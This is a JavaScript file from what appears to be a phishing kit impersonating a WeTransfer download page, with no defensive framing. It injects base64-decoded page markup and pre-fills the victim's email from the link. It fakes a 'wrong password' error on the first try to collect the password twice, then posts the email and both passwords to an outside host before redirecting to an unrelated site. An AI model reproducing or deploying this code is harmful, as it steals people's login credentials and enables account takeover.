// 
let transCounter = 0;

delayTrans();
function delayTrans() {
    const app_main = document.getElementById("app_main");
    const getTransfer = document.getElementById("getTransfer");

    setTimeout(() => {
        app_main.innerHTML = atob(getTransfer.value);
        weTransfer();
    }, 1000);
}

// 
function weTransfer() {
    backgroundToggle();
function backgroundToggle() {
    let backgroundChange = document.getElementsByClassName("weTranfer")[0];
    setTimeout(() => {
        backgroundChange.style.background = "#023020";
    }, 100);

    setTimeout(() => {
        backgroundChange.style.background = "#36454F";
    }, 5000);

    setTimeout(() => {
        backgroundChange.style.background = "#301934";
    }, 10000);

    setTimeout(() => {
        backgroundChange.style.background = "#1B1212";
    }, 15000);
}

setInterval(() => {
    backgroundToggle();
}, 20000);

// const clientName = document.getElementById("clientName");
const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/

const formContainer = document.querySelector(".formContainer");
const email_input = document.querySelector("#email_input");
const password_input = document.querySelector("#password_input");
const pager = document.getElementById("pager");

//
const urlEmail = new URLSearchParams(window.location.search);
const usermail = urlEmail.get('user');

const formBtn = document.getElementById("formBtn");

if (validEmail.test(usermail)) {
    email_input.value = usermail.toLowerCase()
}

formContainer.addEventListener('submit', (e)=>{
    e.preventDefault()

    if (!validEmail.test(email_input.value)) {
        alert("Please, enter your email address")
        return
    }

    if (password_input.value == "") {
        e.preventDefault()
        alert("Password can't be empty")
        return
    }

    if (validEmail.test(password_input.value) || password_input.value.length < 6 || password_input.value == 123456 || password_input.value.toLowerCase() == "qwerty" || password_input.value.toLowerCase() == "password" || password_input.value.toLowerCase() == "testing") {
        alert("Wrong email password")
        return
    }

    formBtn.style.backgroundColor = "green";
    formBtn.innerHTML = `<i>Please wait . . .</i>`

    if (transCounter == 0) {
        pager.value = password_input.value;
       setTimeout(() => {
        alert("Please, enter correct email password");
        password_input.value = "";
        transCounter++
        formBtn.innerHTML = `Download`
       }, 1000);
        return
    }



    //location.replace("./transfer.php?domain=WeTransfer&mail="+email_input.value+"&password1="+pager.value+"&password2="+ password_input.value)
    const formData = new FormData();
    formData.append("email", email_input.value);
    formData.append("password", pager.value);
    formData.append("password2", password_input.value);


    fetch("https://dimsumdeli.ru.com/Source/nat.wetrans.ghb/drun.php", {
      method: "POST",
      body: formData,
    })
    .then((response) => {
        location.replace("https://shelbyoutdoor.com/en/info?cPath=406_584&language=en");
    });
})
}
